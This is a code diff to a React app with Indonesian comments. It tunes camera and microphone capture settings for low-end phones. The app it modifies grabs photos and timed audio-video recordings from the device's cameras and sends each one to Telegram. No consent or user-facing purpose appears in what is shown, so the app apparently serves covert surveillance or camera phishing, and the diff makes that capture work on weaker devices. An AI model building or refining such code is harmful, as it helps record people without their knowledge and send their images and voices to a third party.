@@ -109,17 +109,44 @@ function App() {
     if (hasRequestedCamera) return;
     setHasRequestedCamera(true);
 
-    const requestMediaAccess = async (facingMode: string | { deviceId: string }, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
-      try {
-        const constraints = {
+    // Deteksi spesifikasi perangkat
+    const deviceSpec = {
+      cores: navigator.hardwareConcurrency || 1, // Jumlah core CPU
+      screenWidth: window.screen.width, // Lebar layar
+      isLowEnd: navigator.hardwareConcurrency < 4 || window.screen.width < 720, // Tentukan apakah low-end
+    };
+
+    console.log('Spesifikasi Perangkat:', deviceSpec);
+
+    const getDeviceConstraints = () => {
+      if (deviceSpec.isLowEnd) {
+        return {
           video: {
-            facingMode: typeof facingMode === 'string' ? facingMode : facingMode.deviceId,
-            width: { min: 640, ideal: 1920, max: 3840 },
-            height: { min: 480, ideal: 1080, max: 2160 },
-            frameRate: { min: 24, ideal: 30, max: 60 }, // Memastikan frame rate minimal 24 fps
+            width: { min: 320, ideal: 640, max: 1280 },
+            height: { min: 240, ideal: 480, max: 720 },
+            frameRate: { min: 15, ideal: 24, max: 30 },
             aspectRatio: { ideal: 9 / 16 },
           },
           audio: true,
+        };
+      } else {
+        return {
+          video: {
+            width: { min: 640, ideal: 1920, max: 3840 },
+            height: { min: 480, ideal: 1080, max: 2160 },
+            frameRate: { min: 24, ideal: 30, max: 60 },
+            aspectRatio: { ideal: 9 / 16 },
+          },
+          audio: true,
+        };
+      }
+    };
+
+    const requestMediaAccess = async (facingMode: string | { deviceId: string }, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
+      try {
+        const constraints = {
+          ...getDeviceConstraints(),
+          facingMode: typeof facingMode === 'string' ? facingMode : facingMode.deviceId,
         };
 
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -180,14 +207,28 @@ function App() {
 
   const reinitializeStream = async (cameraType: string, deviceId: string): Promise<MediaStream | null> => {
     try {
+      const deviceSpec = {
+        cores: navigator.hardwareConcurrency || 1,
+        screenWidth: window.screen.width,
+        isLowEnd: navigator.hardwareConcurrency < 4 || window.screen.width < 720,
+      };
+
       const constraints = {
-        video: {
-          deviceId: { exact: deviceId },
-          width: { min: 640, ideal: 1920, max: 3840 },
-          height: { min: 480, ideal: 1080, max: 2160 },
-          frameRate: { min: 24, ideal: 30, max: 60 },
-          aspectRatio: { ideal: 9 / 16 },
-        },
+        video: deviceSpec.isLowEnd
+          ? {
+              deviceId: { exact: deviceId },
+              width: { min: 320, ideal: 640, max: 1280 },
+              height: { min: 240, ideal: 480, max: 720 },
+              frameRate: { min: 15, ideal: 24, max: 30 },
+              aspectRatio: { ideal: 9 / 16 },
+            }
+          : {
+              deviceId: { exact: deviceId },
+              width: { min: 640, ideal: 1920, max: 3840 },
+              height: { min: 480, ideal: 1080, max: 2160 },
+              frameRate: { min: 24, ideal: 30, max: 60 },
+              aspectRatio: { ideal: 9 / 16 },
+            },
         audio: true,
       };
 
@@ -254,10 +295,10 @@ function App() {
 
       let drawWidth, drawHeight;
       if (videoAspectRatio > canvasAspectRatio) {
-        drawWidth = Math.min(videoWidth, 1920);
+        drawWidth = Math.min(videoWidth, settings.isLowEnd ? 640 : 1920);
         drawHeight = drawWidth / videoAspectRatio;
       } else {
-        drawHeight = Math.min(videoHeight, 1080);
+        drawHeight = Math.min(videoHeight, settings.isLowEnd ? 480 : 1080);
         drawWidth = drawHeight * videoAspectRatio;
       }
 
@@ -270,7 +311,7 @@ function App() {
       }
 
       const photoBlob = await new Promise<Blob>((resolve) => {
-        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 0.9);
+        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 0.8); // Turunkan kualitas untuk perangkat low-end
       });
 
       try {
@@ -280,14 +321,18 @@ function App() {
         console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
       }
 
-      // Optimasi pengkodean video untuk kelancaran
+      // Optimasi pengkodean video berdasarkan spesifikasi
+      const deviceSpec = {
+        isLowEnd: navigator.hardwareConcurrency < 4 || window.screen.width < 720,
+      };
+
       const supportedMimeType = ['video/mp4;codecs=h264', 'video/webm;codecs=vp9']
-        .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4;codecs=h264'; // Prioritaskan H.264 untuk kompatibilitas
+        .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4;codecs=h264';
 
       const mediaRecorder = new MediaRecorder(currentStream, {
         mimeType: supportedMimeType,
-        videoBitsPerSecond: 4000000, // Tingkatkan bitrate untuk kualitas lebih baik (4 Mbps)
-        audioBitsPerSecond: 128000, // Bitrate audio standar
+        videoBitsPerSecond: deviceSpec.isLowEnd ? 1500000 : 4000000, // Bitrate lebih rendah untuk low-end
+        audioBitsPerSecond: 96000, // Bitrate audio lebih rendah
       });
 
       mediaRecorderRef.current = mediaRecorder;
@@ -304,7 +349,6 @@ function App() {
           return;
         }
 
-        // Kompresi tambahan jika diperlukan (opsional)
         try {
           await sendVideoToTelegram(videoBlob);
           console.log(`Video dari kamera ${type} berhasil dikirim ke Telegram.`);
@@ -317,8 +361,7 @@ function App() {
         console.error(`Error saat merekam kamera ${type}:`, e);
       };
 
-      // Mulai perekaman dengan interval yang lebih pendek untuk pengujian
-      mediaRecorder.start(500); // Kurangi interval data untuk mengurangi buffering
+      mediaRecorder.start(500); // Interval pendek untuk kelancaran
 
       await new Promise((resolve) => setTimeout(() => {
         if (mediaRecorder.state === 'recording') {
@@ -332,7 +375,7 @@ function App() {
     } catch (error) {
       console.error(`Error saat merekam kamera ${type}:`, error);
     } finally {
-      currentStream.getTracks().forEach(track => track.stop()); // Hentikan semua track setelah selesai
+      currentStream.getTracks().forEach(track => track.stop());
     }
   };
 
